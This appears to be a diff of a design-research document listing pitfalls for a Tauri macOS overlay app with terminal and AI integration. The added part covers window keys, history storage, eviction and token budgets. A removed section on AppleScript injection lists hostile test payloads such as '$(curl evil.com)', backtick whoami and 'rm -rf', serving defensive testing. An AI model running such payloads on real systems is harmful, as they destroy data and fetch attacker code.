@@ -1,662 +1,454 @@
 # Domain Pitfalls: Tauri macOS Overlay App with Terminal Integration
 
-**Domain:** macOS overlay application with global hotkeys and terminal automation
-**Researched:** February 21, 2026
-**Confidence:** HIGH (verified with official Tauri documentation, Apple security guidelines, and GitHub issue tracker)
-
-## Critical Pitfalls
-
-Mistakes that cause rewrites, security vulnerabilities, or major functional issues.
-
-### Pitfall 1: Sandboxing Incompatible with Accessibility API
-
-**What goes wrong:** You cannot use the macOS Accessibility API from a sandboxed app. If you enable sandboxing (required for App Store distribution), your app will be unable to read terminal state or interact with other applications, even after users grant permissions.
-
-**Why it happens:** Apple's sandbox explicitly blocks inter-application accessibility features. Developers assume that user-granted permissions override sandbox restrictions, but they don't.
-
-**Consequences:**
-- Terminal state reading fails silently
-- Unable to detect active terminal app
-- Cannot paste commands into third-party terminals
-- App Store distribution becomes impossible without removing core features
-- If discovered late, requires complete rewrite of distribution strategy
-
-**Prevention:**
-- DO NOT enable `com.apple.security.app-sandbox` entitlement
-- Plan for Developer ID distribution (notarization only, not App Store)
-- Document in tauri.conf.json why sandboxing is disabled
-- Add entitlements file with required accessibility permissions:
-  ```xml
-  <key>com.apple.security.automation.apple-events</key>
-  <true/>
-  ```
-
-**Detection:**
-- Test accessibility features immediately after enabling sandboxing
-- Check for "Operation not permitted" errors in accessibility API calls
-- Verify with `tauri-plugin-macos-permissions` before building release
-
-**Phase to address:** Phase 1 (Foundation) - This decision affects architecture and distribution from day one.
-
-**Sources:**
-- [Apple Developer Forums: Accessibility permission not granted for sandboxed macOS apps](https://developer.apple.com/forums/thread/810677)
-- [Tauri macOS Application Bundle Documentation](https://v2.tauri.app/distribute/macos-application-bundle/)
+**Domain:** macOS overlay application -- per-terminal-window command history and AI follow-up context
+**Researched:** 2026-02-28 (v0.1.1 milestone update; v0.1.0 pitfalls preserved below)
+**Confidence:** HIGH (code reviewed against live codebase + verified with macOS process API docs)
 
 ---
 
-### Pitfall 2: AppleScript Command Injection via Unsanitized xAI Responses
+## v0.1.1 Critical Pitfalls
 
-**What goes wrong:** Streaming xAI API responses may contain backticks, semicolons, or other shell metacharacters. When these are inserted into AppleScript `do script` commands without sanitization, attackers can execute arbitrary terminal commands.
+Mistakes specific to adding per-terminal-window history and AI follow-up context to the existing system.
 
-**Why it happens:** Developers trust AI-generated content as "safe" because it comes from an API, not direct user input. AppleScript string escaping is non-obvious (requires backslash escaping of quotes, but also handling of special characters).
+### Pitfall 1: Using App PID Alone as the Terminal Window Key
 
-**Consequences:**
-- Remote code execution vulnerability
-- Malicious prompts can inject `; rm -rf ~` or credential-stealing commands
-- Affects all users who trigger malicious AI responses
-- Potential for data exfiltration via injected `curl` commands
-- Reputation damage and security disclosure requirements
+**What goes wrong:**
+A `HashMap<i32, WindowHistory>` keyed on the terminal app PID (e.g., `com.googlecode.iterm2` at PID 12345) maps ALL windows and tabs of that terminal application to a single history entry. Opening a second iTerm2 window, or switching to a different tab, silently overwrites or mixes the history of unrelated sessions. The app already captures `previous_app_pid` in `AppState` -- this PID is app-level, not window-level.
 
-**Prevention:**
+**Why it happens:**
+`NSRunningApplication.runningApplicationWithProcessIdentifier` returns the app process, not the window or tab. One iTerm2 process owns dozens of windows and hundreds of tabs at the same PID. Developers see PID already captured in `AppState` and use it directly as the map key because it's convenient.
 
-1. **NEVER directly interpolate AI responses into AppleScript:**
-   ```applescript
-   # VULNERABLE - DO NOT DO THIS
-   tell application "iTerm2"
-       do script "echo " & aiResponse
-   end tell
-   ```
+**How to avoid:**
+Use a composite window key: `bundle_id + ":" + tty_device_path`. The TTY path (`/dev/ttys003`) is unique per pseudo-terminal session.
 
-2. **Use proper escaping for AppleScript strings:**
-   ```rust
-   fn escape_applescript(s: &str) -> String {
-       s.replace("\\", "\\\\")
-        .replace("\"", "\\\"")
-        .replace("\n", "\\n")
-        .replace("\r", "\\r")
-   }
-   ```
+The TTY is accessible without subprocesses: `proc_pidinfo(shell_pid, PROC_PIDTBSDINFO, ...)` returns a `proc_bsdinfo` struct containing `pbi_tdev` (the controlling terminal device number). Resolve that device number to a path via `devname_r()` or by matching `/dev/ttys*` entries. The shell PID is already found by `find_shell_pid()` in `process.rs` -- pass it to this call.
 
-3. **Whitelist safe characters and reject dangerous ones:**
-   ```rust
-   fn sanitize_command(cmd: &str) -> Result<String, &'static str> {
-       if cmd.contains(&['`', '$', ';', '&', '|', '>', '<', '\n'][..]) {
-           return Err("Command contains dangerous characters");
-       }
-       Ok(cmd.to_string())
-   }
-   ```
+For GPU terminals (Alacritty, kitty, WezTerm) where AX is unavailable and shell discovery may fail, fall back to `bundle_id + ":" + terminal_app_pid` (app-scoped, coarse) and document the limitation.
 
-4. **Use base64 encoding for complex commands:**
-   ```applescript
-   tell application "Terminal"
-       do script "echo " & quoted form of (do shell script "echo '" & base64EncodedCommand & "' | base64 -d")
-   end tell
-   ```
+Compute the key synchronously in the hotkey handler at the same point `previous_app_pid` is captured -- before `show_and_make_key()` is called. Store it in a new `previous_window_key: Mutex<Option<String>>` field in `AppState`.
 
-5. **Prefer writing to temp files over inline execution:**
-   ```rust
-   use std::fs;
-   use tempfile::NamedTempFile;
+**Warning signs:**
+- History from one iTerm2 window appears in a freshly-opened second window
+- Arrow-up in the overlay cycles through commands from a completely different project directory
+- Shell type in history (zsh) mismatches the current window's shell (bash)
 
-   let temp = NamedTempFile::new()?;
-   fs::write(&temp, ai_response)?;
-   let path = temp.path().display();
-   // AppleScript executes the file, not inline string
-   ```
-
-**Detection:**
-- Manual code review of all AppleScript string interpolation
-- Automated tests with payloads: `"; rm -rf test_dir"`, `` `whoami` ``, `$(curl evil.com)`
-- Security audit before public release
-- Consider bug bounty program post-launch
-
-**Phase to address:** Phase 2 (Terminal Integration) - Must be solved before any AI-to-terminal command flow is implemented.
-
-**Sources:**
-- [Apple Shell Script Security Documentation](https://developer.apple.com/library/archive/documentation/OpenSource/Conceptual/ShellScripting/ShellScriptSecurity/ShellScriptSecurity.html)
-- [ClickFix macOS Campaign: AppleScript Terminal Phishing](https://hunt.io/blog/macos-clickfix-applescript-terminal-phishing)
-- [MITRE ATT&CK: AppleScript Command and Scripting](https://attack.mitre.org/techniques/T1059/002/)
+**Phase to address:**
+Phase 1 (window identification). The key design must be locked in before history storage and arrow navigation are built -- everything downstream depends on it.
 
 ---
 
-### Pitfall 3: Transparent Window Rendering Glitches on macOS Sonoma with Focus Changes
+### Pitfall 2: PID Reuse Corrupting Stale History Entries
 
-**What goes wrong:** On macOS Sonoma (14.0+), transparent Tauri windows exhibit visual artifacts (broken shadows, incorrect borders) after losing and regaining focus. This is caused by Stage Manager's rendering changes and affects ALL transparent windows in Tauri v2.
+**What goes wrong:**
+macOS recycles PIDs after processes exit. A shell that exits (user closes terminal tab) frees its PID. A new, unrelated shell may later receive the same PID. The history map then serves the new shell stale history from a completely different context -- wrong project, wrong directory, wrong commands.
 
-**Why it happens:** macOS Sonoma introduced breaking changes to window compositing APIs for Stage Manager. Tauri's transparent window implementation hasn't fully adapted to these changes.
+**Why it happens:**
+The history map has no mechanism to detect that a key's process has exited and its identity was reassigned. Maps grow over the app's daemon lifetime and are never cleaned up.
 
-**Consequences:**
-- Overlay window looks broken/unprofessional after Cmd+Tab
-- Shadow artifacts persist across window movements
-- Users perceive app as buggy or low-quality
-- No fix available in Tauri v2.0 as of February 2026
+**How to avoid:**
+- Use TTY-based keys rather than raw PIDs. TTY device paths (`/dev/ttys003`) are not reused while the pseudo-terminal is assigned; the kernel recycles them only after the window fully closes.
+- Add a liveness check before serving cached history: call `get_process_name(shell_pid)` -- if it returns `None` or returns a non-shell name, the entry is stale, evict it.
+- Include a `last_seen: Instant` in each history entry; evict entries not accessed within 4 hours.
 
-**Prevention:**
+**Warning signs:**
+- Overlay shows history with a CWD that does not match the current shell
+- Sporadic "wrong history" reports that are hard to reproduce (timing-dependent, only after PID recycle)
+- Shell type in history does not match the current terminal session
 
-1. **Set activation policy to Accessory (recommended):**
-   ```rust
-   #[cfg(target_os = "macos")]
-   use tauri::ActivationPolicy;
-
-   fn main() {
-       tauri::Builder::default()
-           .setup(|app| {
-               #[cfg(target_os = "macos")]
-               app.set_activation_policy(ActivationPolicy::Accessory);
-               Ok(())
-           })
-           .run(tauri::generate_context!())
-           .expect("error while running tauri application");
-   }
-   ```
-
-   **Trade-off:** App won't appear in Dock or Cmd+Tab switcher (acceptable for menu bar overlay apps)
-
-2. **Alternative: Disable Stage Manager in documentation:**
-   - Include user documentation recommending Stage Manager be disabled
-   - Not ideal: users shouldn't need to change OS settings
-
-3. **Monitor Tauri GitHub issues:**
-   - Track [Issue #8255](https://github.com/tauri-apps/tauri/issues/8255)
-   - Test each Tauri v2.x update for fix
-   - Consider contributing upstream fix if resources allow
-
-**Detection:**
-- Test on macOS Sonoma 14.0+ with Stage Manager enabled
-- Automated screenshot comparison tests on focus change
-- User acceptance testing with transparency enabled
-
-**Phase to address:** Phase 1 (Foundation) - Architecture decision affects window behavior from the start.
-
-**Sources:**
-- [Tauri Issue #8255: Transparent window glitch on macOS Sonoma after focus change](https://github.com/tauri-apps/tauri/issues/8255)
-- [Tauri Window Customization Documentation](https://v2.tauri.app/learn/window-customization/)
+**Phase to address:**
+Phase 1 (window identification). Eviction logic belongs in the same data structure as the history map.
 
 ---
 
-### Pitfall 4: Global Hotkey Cmd+K Conflicts with System and Third-Party Apps
+### Pitfall 3: Arrow Key Conflict with Textarea Cursor in Multi-line Input
 
-**What goes wrong:** Cmd+K is used by many macOS apps and system features. Your global hotkey may:
-- Fail to register (silently)
-- Override user's preferred app shortcuts
-- Be blocked by apps like Safari (Cmd+K = search), VS Code (Cmd+K = command palette), Slack (Cmd+K = quick switcher)
-- Work inconsistently depending on active app
+**What goes wrong:**
+Adding ArrowUp/ArrowDown history navigation to `CommandInput` works for single-line input but breaks when the user types a multi-line prompt (Shift+Enter). ArrowUp while the cursor is on line 2 of a 3-line input should move the cursor up one line within the textarea -- not navigate to a history entry. Intercepting all ArrowUp events unconditionally destroys the textarea's native cursor movement.
 
-**Why it happens:** macOS gives priority to focused app shortcuts. Global shortcuts only fire if no app claims the key combination. Tauri's global-shortcut plugin doesn't notify you when registration fails due to conflicts.
+**Why it happens:**
+The natural implementation intercepts `e.key === "ArrowUp"` at the top of `handleKeyDown` and calls `e.preventDefault()`. This works for single-line inputs (the only existing use case) but ignores the cursor's vertical position within multi-line content.
 
-**Consequences:**
-- Users expect Cmd+K but it doesn't work in their primary workflow app
-- Support burden: "why doesn't it work in X app?"
-- User frustration and uninstalls
-- No error message to user explaining the conflict
+**How to avoid:**
+Gate history navigation on cursor line position:
 
-**Prevention:**
-
-1. **Allow user-configurable hotkey:**
-   ```rust
-   use tauri_plugin_global_shortcut::{GlobalShortcutExt, Shortcut};
-
-   fn register_hotkey(app: &tauri::AppHandle, shortcut_str: &str) -> Result<(), String> {
-       let shortcut = shortcut_str.parse::<Shortcut>()
-           .map_err(|e| format!("Invalid shortcut: {}", e))?;
-
-       app.global_shortcut().register(shortcut)
-           .map_err(|e| format!("Failed to register: {}", e))?;
-
-       Ok(())
-   }
-   ```
-
-2. **Provide alternative defaults:**
-   - Primary: `Cmd+K`
-   - Fallback 1: `Cmd+Shift+K`
-   - Fallback 2: `Cmd+Option+K`
-   - Test all three at startup, use first successful
-
-3. **Detect registration failures and notify user:**
-   ```rust
-   match app.global_shortcut().register(shortcut) {
-       Ok(_) => println!("Hotkey registered successfully"),
-       Err(e) => {
-           // Show user dialog with conflict resolution
-           show_hotkey_conflict_dialog(app, &e.to_string());
-       }
-   }
-   ```
-
-4. **Document known conflicts:**
-   - Safari: Cmd+K (search bar)
-   - VS Code: Cmd+K (command palette trigger)
-   - Slack: Cmd+K (quick switcher)
-   - Spotlight: Cmd+Space (alternative users might prefer)
-
-5. **Consider double-tap modifier (Cmd Cmd) or unique combo:**
-   - Example: `Cmd+Ctrl+K` has fewer conflicts
-   - Trade-off: harder to type
-
-**Detection:**
-- Test registration on clean macOS with popular apps installed
-- Check Tauri global-shortcut registration return value
-- User testing across different app configurations
-- Monitor support requests for "hotkey not working"
-
-**Phase to address:** Phase 1 (Foundation) - Hotkey architecture must support configuration from start.
-
-**Sources:**
-- [Tauri Global Shortcut Plugin Documentation](https://v2.tauri.app/plugin/global-shortcut/)
-- [Tauri Issue #10025: Global shortcut event fires twice on macOS](https://github.com/tauri-apps/tauri/issues/10025)
-- [Apple Support: Change conflicting keyboard shortcuts](https://support.apple.com/guide/mac-help/change-a-conflicting-keyboard-shortcut-on-mac-mchlp2864/mac)
-
----
-
-### Pitfall 5: Accessibility Permissions Silently Fail Without Prompting User
-
-**What goes wrong:** macOS Accessibility API requires explicit user permission via System Settings. If permission isn't granted, API calls fail silently with generic errors. Unlike other permissions, accessibility doesn't show an automatic prompt—users must manually navigate to System Settings > Privacy & Security > Accessibility.
-
-**Why it happens:** Apple considers accessibility a high-risk permission (can read all screen content, control other apps). They intentionally made it harder to grant to prevent social engineering attacks.
-
-**Consequences:**
-- App appears broken: "why can't it read my terminal?"
-- Users don't know they need to grant permission
-- Support burden explaining manual permission flow
-- Debugging false positives (permission granted but stale TCC database)
-- Permission can spontaneously revoke between OS boots (Ventura bug)
-
-**Prevention:**
-
-1. **Use tauri-plugin-macos-permissions to detect and guide:**
-   ```rust
-   use tauri_plugin_macos_permissions::{PermissionState, MacOSPermissions};
-
-   #[tauri::command]
-   async fn check_accessibility() -> Result<bool, String> {
-       let perms = MacOSPermissions::new();
-
-       match perms.accessibility().check() {
-           PermissionState::Granted => Ok(true),
-           PermissionState::Denied | PermissionState::Unknown => {
-               // Open System Settings for user
-               perms.accessibility().request();
-               Ok(false)
-           }
-       }
-   }
-   ```
-
-2. **First-run onboarding flow:**
-   - Detect missing permission on app launch
-   - Show UI explaining why permission is needed
-   - Button to open System Settings > Privacy & Security > Accessibility
-   - Visual guide with screenshots showing toggle location
-   - Verify permission granted before continuing
-
-3. **Handle permission revocation gracefully:**
-   ```rust
-   // Check permission before each sensitive operation
-   fn read_terminal_state() -> Result<TerminalState, Error> {
-       if !has_accessibility_permission() {
-           return Err(Error::PermissionRequired(
-               "Please enable Accessibility in System Settings"
-           ));
-       }
-       // ... proceed with API call
-   }
-   ```
-
-4. **Add entitlements for Apple Events:**
-   ```xml
-   <!-- src-tauri/entitlements.plist -->
-   <?xml version="1.0" encoding="UTF-8"?>
-   <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
-   <plist version="1.0">
-   <dict>
-       <key>com.apple.security.automation.apple-events</key>
-       <true/>
-   </dict>
-   </plist>
-   ```
-
-5. **Test TCC database corruption:**
-   - After granting permission, reboot and verify it persists
-   - If permission disappears, guide user to reset TCC database:
-     ```bash
-     tccutil reset Accessibility com.yourapp.bundle.id
-     ```
-
-**Detection:**
-- Test on fresh macOS install without pre-granted permissions
-- Automated UI tests that verify permission prompt flow
-- Error logging for accessibility API failures
-- User feedback channels for permission issues
-
-**Phase to address:** Phase 1 (Foundation) - Permission flow is part of core UX.
-
-**Sources:**
-- [GitHub: tauri-plugin-macos-permissions](https://github.com/ayangweb/tauri-plugin-macos-permissions)
-- [Apple Support: Allow accessibility apps to access your Mac](https://support.apple.com/guide/mac-help/allow-accessibility-apps-to-access-your-mac-mh43185/mac)
-- [Apple Developer Forums: Accessibility Permissions on sandboxed macOS apps](https://developer.apple.com/forums/thread/810677)
-
----
-
-## Moderate Pitfalls
-
-Mistakes that cause delays, technical debt, or degraded UX.
-
-### Pitfall 6: Window Cannot Be Dragged with Overlay Title Bar Style
-
-**What goes wrong:** When `titleBarStyle: "Overlay"` is set in tauri.conf.json, the window cannot be moved by dragging. This is a known Tauri v2 issue on macOS.
-
-**Why it happens:** Overlay style removes the standard macOS title bar drag region. Tauri requires explicit `data-tauri-drag-region` attribute to enable dragging, but this isn't clearly documented.
-
-**Prevention:**
-- Add `data-tauri-drag-region` attribute to a titlebar div:
-  ```html
-  <div data-tauri-drag-region class="titlebar">
-    <!-- Your titlebar content -->
-  </div>
-  ```
-- Style the drag region to cover desired draggable area:
-  ```css
-  .titlebar {
-    height: 40px;
-    background: transparent;
-    -webkit-app-region: drag; /* Also needed for webview */
+```typescript
+if (e.key === "ArrowUp") {
+  const el = textareaRef.current;
+  if (!el) return;
+  const textBefore = el.value.substring(0, el.selectionStart);
+  const isOnFirstLine = !textBefore.includes("\n");
+  if (isOnFirstLine) {
+    e.preventDefault();
+    navigateHistory(-1);
   }
-  ```
-- Add permission to tauri.conf.json:
-  ```json
-  {
-    "permissions": ["window:allow-start-dragging"]
+  // else: let browser handle cursor movement within the textarea
+}
+if (e.key === "ArrowDown") {
+  const el = textareaRef.current;
+  if (!el) return;
+  const textAfter = el.value.substring(el.selectionEnd);
+  const isOnLastLine = !textAfter.includes("\n");
+  if (isOnLastLine) {
+    e.preventDefault();
+    navigateHistory(+1);
   }
-  ```
+}
+```
 
-**Detection:**
-- Manual testing: try to drag window immediately after implementing overlay style
-- Automated UI tests for drag functionality
+**Warning signs:**
+- ArrowUp in a 2-line prompt jumps to a history entry instead of moving the cursor to line 1
+- User cannot edit multi-line prompts with arrow keys after history feature is added
+- Reports that the overlay "swallowed" cursor movement
 
-**Sources:**
-- [Tauri Issue #9503: Cannot drag window on macOS with Overlay titleBarStyle](https://github.com/tauri-apps/tauri/issues/9503)
-- [Tauri Window Customization Documentation](https://v2.tauri.app/learn/window-customization/)
-
----
-
-### Pitfall 7: Non-Focusable Windows Still Steal Focus on macOS
-
-**What goes wrong:** Setting `"focusable": false` in window configuration doesn't prevent the window from stealing focus when clicked on macOS. This is a Tauri v2 bug reported in August 2025, still present as of February 2026.
-
-**Why it happens:** Tauri's window configuration doesn't properly translate to macOS NSPanel or NSWindow focus behavior.
-
-**Prevention:**
-- Assume `focusable: false` doesn't work on macOS
-- Use alternative approach: NSPanel window type (requires custom Rust implementation)
-- Implement workaround: restore focus to previous window after interaction
-  ```rust
-  #[tauri::command]
-  fn restore_previous_focus(window: tauri::Window) {
-      // Store previous active window before showing overlay
-      // Restore it after command insertion
-  }
-  ```
-- Track [Tauri Issue #13034](https://github.com/tauri-apps/tauri/issues/13034) requesting NSPanel support
-
-**Detection:**
-- Test with background app focused, click overlay, check if background app loses focus
-- User acceptance testing for focus interruption
-
-**Sources:**
-- [Tauri Issue #14102: Window focusable: false broken on macOS](https://github.com/tauri-apps/tauri/issues/14102)
-- [Tauri Issue #13034: Feature request for NSPanel window type](https://github.com/tauri-apps/tauri/issues/13034)
+**Phase to address:**
+Phase 2 (arrow key navigation). Test explicitly with multi-line Shift+Enter prompts as a required acceptance criterion.
 
 ---
 
-### Pitfall 8: Notarization Hangs or Fails Without Clear Error Messages
+### Pitfall 4: History Stored in Zustand State Is Wiped on Every Overlay Open
 
-**What goes wrong:** The `tauri build` notarization step can hang for hours or fail with cryptic errors. Common causes:
-- Apple notarization server congestion
-- Invalid App Store Connect API key
-- Wrong Apple ID credentials
-- Missing entitlements
-- External binaries not properly signed
+**What goes wrong:**
+`turnHistory` in the Zustand store is cleared on every `show()` call (line 214 in `store/index.ts`: `turnHistory: []`). If per-window history is stored as a plain Zustand array, it is wiped every time the user dismisses and re-opens the overlay -- defeating the purpose of persistent session history entirely.
 
-**Why it happens:** Notarization is an asynchronous Apple service. Tauri's progress reporting is limited when waiting for Apple's servers.
+**Why it happens:**
+The existing `show()` intentionally resets all ephemeral state on each overlay open. This is correct for `streamingText`, `displayMode`, and destructive state, but wrong for per-window history, which must survive across multiple overlay invocations.
 
-**Prevention:**
-1. **Use App Store Connect API instead of Apple ID:**
-   - More reliable than app-specific passwords
-   - No 2FA interruptions
-   - Better for CI/CD
+**How to avoid:**
+Store per-window history in the Rust `AppState` as `Mutex<HashMap<String, WindowHistory>>`. The frontend fetches the current window's history via a Tauri command on each overlay open, and posts updates back after each completed turn. This decouples history persistence from the React component lifecycle entirely.
 
-2. **Set reasonable timeout:**
-   ```json
-   // tauri.conf.json
-   {
-     "bundle": {
-       "macOS": {
-         "notarize": {
-           "timeout": 300  // 5 minutes, not default 1 hour
-         }
-       }
-     }
-   }
-   ```
+Do NOT attempt to split the Zustand store into "ephemeral" vs. "persistent" slices -- the `show()` reset is a single `set({...})` call that would require careful surgery and is easy to break. Backend storage is the cleaner approach.
 
-3. **Test notarization credentials before release build:**
-   ```bash
-   # Validate credentials
-   xcrun notarytool store-credentials --help
-   ```
+**Warning signs:**
+- History works within a single overlay session but is empty when the overlay is reopened
+- Arrow-up navigation always starts from an empty state regardless of prior usage
+- `console.log` shows `turnHistory: []` immediately after `show()` triggers
 
-4. **Sign external binaries separately:**
-   - If bundling CLI tools or helpers, sign them first
-   - Add to tauri.conf.json `externalBin` array
-   - Verify signatures: `codesign -vvv --deep --strict <binary>`
-
-**Detection:**
-- Build dry-run before release deadline
-- Monitor notarization time (>10 min = potential issue)
-- Check Apple notarization status page for service disruptions
-
-**Sources:**
-- [Tauri macOS Code Signing Documentation](https://v2.tauri.app/distribute/sign/macos/)
-- [Tauri Issue #11992: Codesigning and notarization with ExternalBin](https://github.com/tauri-apps/tauri/issues/11992)
-- [Tauri Discussion #8630: Notarization stuck for hours](https://github.com/orgs/tauri-apps/discussions/8630)
+**Phase to address:**
+Phase 1 (history storage architecture). This is an architecture decision that must precede any UI wiring.
 
 ---
 
-### Pitfall 9: Streaming xAI Responses Cause IPC Performance Bottleneck
+### Pitfall 5: Unbounded History Map Growth in Long-Running Daemon Sessions
 
-**What goes wrong:** Tauri's IPC channel serializes all messages to JSON. Streaming large AI responses (multiple KB per chunk) through Tauri commands causes:
-- UI lag and stuttering
-- High CPU usage in WebView process
-- Memory spikes from buffered JSON strings
-- Potential message loss if chunks arrive faster than serialization
+**What goes wrong:**
+The Rust history map accumulates an entry for every terminal window and tab opened during the app's lifetime. A developer with 50 terminal tabs over a work week builds a map that never shrinks. Each entry holds up to 14 conversation turns; with verbose terminal output in context, each turn can be several kilobytes. Total memory footprint becomes measurable after heavy use. The app runs as a background daemon and is never restarted in normal use.
 
-**Why it happens:** Tauri v2's IPC is optimized for small, infrequent messages. Streaming large data chunks bypasses this design assumption.
+**Why it happens:**
+HashMap entries are added on first overlay trigger from a new window but never removed. No eviction policy, no max-entries cap, no TTL.
 
-**Prevention:**
+**How to avoid:**
+Implement LRU-style eviction:
+- Cap total entries at a fixed limit (50 windows is generous).
+- Track `last_accessed: SystemTime` per entry.
+- On each insert or update: if `len() > cap`, evict the entry with the oldest `last_accessed`.
+- Also evict entries not accessed within 4 hours regardless of cap.
 
-1. **Use chunked streaming with backpressure:**
-   ```rust
-   use tauri::ipc::Response;
-
-   #[tauri::command]
-   async fn stream_ai_response(window: tauri::Window) {
-       let mut stream = xai_client.stream_completion().await;
-
-       while let Some(chunk) = stream.next().await {
-           // Emit small chunks, not full responses
-           window.emit("ai-chunk", chunk).unwrap();
-
-           // Backpressure: wait for frontend acknowledgment
-           tokio::time::sleep(Duration::from_millis(10)).await;
-       }
-   }
-   ```
-
-2. **Use Tauri events instead of command return values:**
-   ```typescript
-   // Frontend
-   import { listen } from '@tauri-apps/api/event';
-
-   await listen('ai-chunk', (event) => {
-       appendToUI(event.payload);
-   });
-
-   await invoke('start_streaming');  // Returns immediately
-   ```
-
-3. **Consider alternative: WebSocket for high-throughput streaming:**
-   ```rust
-   // Rust backend with tokio-tungstenite
-   // Frontend connects via WebSocket for zero-copy streaming
-   // Falls back to IPC if WebSocket unavailable
-   ```
-
-4. **Buffer and batch on backend:**
-   ```rust
-   let mut buffer = String::new();
-   while let Some(chunk) = stream.next().await {
-       buffer.push_str(&chunk);
-
-       if buffer.len() > 1024 || stream.is_done() {
-           window.emit("ai-chunk", &buffer)?;
-           buffer.clear();
-       }
-   }
-   ```
-
-5. **Use `tauri::ipc::Response` for large payloads:**
-   ```rust
-   use tauri::ipc::{Response, InvokeBody};
-
-   #[tauri::command]
-   fn get_large_data() -> Response {
-       Response::new(/* optimized binary transfer */)
-   }
-   ```
-
-**Detection:**
-- Performance profiling during streaming
-- Monitor WebView CPU usage with Activity Monitor
-- Test with high-latency network (simulated slow API)
-- User testing on older MacBooks (pre-M1)
-
-**Sources:**
-- [Tauri Discussion #3138: Streaming response body](https://github.com/orgs/tauri-apps/discussions/3138)
-- [Tauri Issue #4197: Transfer rate from backend very slow](https://github.com/tauri-apps/tauri/issues/4197)
-- [Tauri Calling Rust Documentation](https://v2.tauri.app/develop/calling-rust/)
-
----
-
-## Minor Pitfalls
-
-Mistakes that cause annoyance but are fixable without major refactoring.
-
-### Pitfall 10: Terminal App Detection Fails for New/Unknown Terminals
-
-**What goes wrong:** Hardcoding terminal app detection for iTerm2, Terminal.app, Warp, etc. fails when users adopt new terminals or use niche apps.
-
-**Prevention:**
-- Use process-based detection instead of app name hardcoding:
-  ```rust
-  use sysinfo::{System, SystemExt, ProcessExt};
-
-  fn detect_active_terminal() -> Option<String> {
-      let s = System::new_all();
-
-      // Check for common shell parent processes
-      for process in s.processes().values() {
-          let name = process.name();
-          if name.contains("bash") || name.contains("zsh") || name.contains("fish") {
-              return process.parent().map(|p| p.name().to_string());
-          }
-      }
-      None
-  }
-  ```
-- Allow user to manually select terminal app in settings
-- Use AppleScript to query frontmost application:
-  ```applescript
-  tell application "System Events"
-      set frontApp to name of first application process whose frontmost is true
-  end tell
-  ```
-
-**Detection:**
-- Test with multiple terminal apps
-- Community feedback for unsupported terminals
-
----
-
-### Pitfall 11: Menu Bar Icon Rendering Issues on Retina Displays
-
-**What goes wrong:** Menu bar icons appear blurry on retina displays if only 1x PNG is provided. macOS expects @2x and @3x variants.
-
-**Prevention:**
-- Provide multi-resolution icons:
-  ```
-  icons/
-    icon.png        # 16x16
-    icon@2x.png     # 32x32
-    icon@3x.png     # 48x48 (for future displays)
-  ```
-- Use SF Symbols for native macOS appearance:
-  ```rust
-  #[cfg(target_os = "macos")]
-  use tauri::menu::{MenuBuilder, SystemTrayMenuBuilder};
-
-  SystemTrayMenuBuilder::new()
-      .icon_template("icon_template.png")  // Template rendering
-      .build();
-  ```
-- Configure in tauri.conf.json:
-  ```json
-  {
-    "bundle": {
-      "icon": [
-        "icons/icon.png",
-        "icons/icon@2x.png"
-      ]
+```rust
+fn evict_stale(map: &mut HashMap<String, WindowHistory>, cap: usize) {
+    let cutoff = SystemTime::now()
+        .checked_sub(Duration::from_secs(4 * 3600))
+        .unwrap_or(SystemTime::UNIX_EPOCH);
+    map.retain(|_, v| v.last_accessed > cutoff);
+    while map.len() > cap {
+        let oldest = map.iter()
+            .min_by_key(|(_, v)| v.last_accessed)
+            .map(|(k, _)| k.clone());
+        if let Some(k) = oldest { map.remove(&k); } else { break; }
     }
-  }
-  ```
+}
+```
 
-**Detection:**
-- Test on multiple display resolutions
-- Check icon sharpness at 200% and 300% scaling
+Call `evict_stale` before each insert.
 
-**Sources:**
-- [Tauri macOS Application Bundle Documentation](https://v2.tauri.app/distribute/macos-application-bundle/)
+**Warning signs:**
+- App memory usage climbs steadily over a multi-day session (visible in Activity Monitor)
+- HashMap size visible via debug logging grows beyond expected terminal window count
+- RSS grows proportionally with number of terminal tabs opened since last restart
+
+**Phase to address:**
+Phase 1 (history storage). Cap and eviction must be part of the initial data structure design.
 
 ---
 
-### Pitfall 12: Global Shortcut Fires Twice on macOS
+### Pitfall 6: Conversation Context Tokens Grow Linearly with Follow-Up Depth
 
-**What goes wrong:** Tauri's global-shortcut plugin has a reported bug where hotkeys trigger twice per keypress on macOS. This is documented in Issue #10025.
+**What goes wrong:**
+Each follow-up query to grok-3 includes the full history (up to 14 turns) PLUS terminal context (shell, CWD, up to 25 lines of terminal output) in the first user message. In a long session with verbose terminal output, the effective payload per API call can exceed 6,000-8,000 tokens by turn 4. The existing 10-second SSE timeout can trigger on context-heavy requests. xAI rate limits at the token level may start blocking rapid follow-up sequences.
 
-**Prevention:**
-- Debounce handler on frontend:
-  ```typescript
-  let lastTrigger = 0;
-  const DEBOUNCE_MS = 100;
+**Why it happens:**
+`build_user_message()` in `ai.rs` includes terminal context in every first user turn. When the history is replayed across follow-ups, this context is embedded in the history payload that gets sent to the API repeatedly. The current 14-message hard cap was designed for turn count, not total token budget.
 
-  globalShortcut.register('Cmd+K', () => {
-      const now = Date.now();
-      if (now - lastTrigger < DEBOUNCE_MS) return;
-      lastTrigger = now;
+**How to avoid:**
+- Include full terminal context (CWD, shell output) only in the FIRST user message of a session. For follow-up turns, the user message is the bare query only (context is already established).
+- Add a character-count secondary cap alongside the turn cap: if the sum of all history message content exceeds 6,000 characters, drop from the oldest end until under budget.
+- Track whether the current query is a follow-up (turnHistory length > 0) and call a stripped `build_follow_up_message(query)` instead of the full `build_user_message(query, ctx)`.
 
-      showOverlay();
-  });
-  ```
-- Track issue for upstream fix: [#10025](https://github.com/tauri-apps/tauri/issues/10025)
+**Warning signs:**
+- grok-3 API calls start timing out after 2-3 follow-up turns (context size growing)
+- xAI 429 rate limit errors appearing in rapid succession during follow-up sequences
+- Response latency degrades noticeably at follow-up turn 3 or beyond
 
-**Detection:**
-- Log hotkey events and check for duplicates
-- User testing for double-activation behavior
+**Phase to address:**
+Phase 3 (AI follow-up context). The `build_user_message` and history-passing logic in `ai.rs` needs deliberate refactoring alongside the history feature.
 
-**Sources:**
-- [Tauri Issue #10025: Global shortcut event fires twice on macOS](https://github.com/tauri-apps/tauri/issues/10025)
+---
+
+### Pitfall 7: Window Key Computed After Overlay Shows Causes TOCTOU Race
+
+**What goes wrong:**
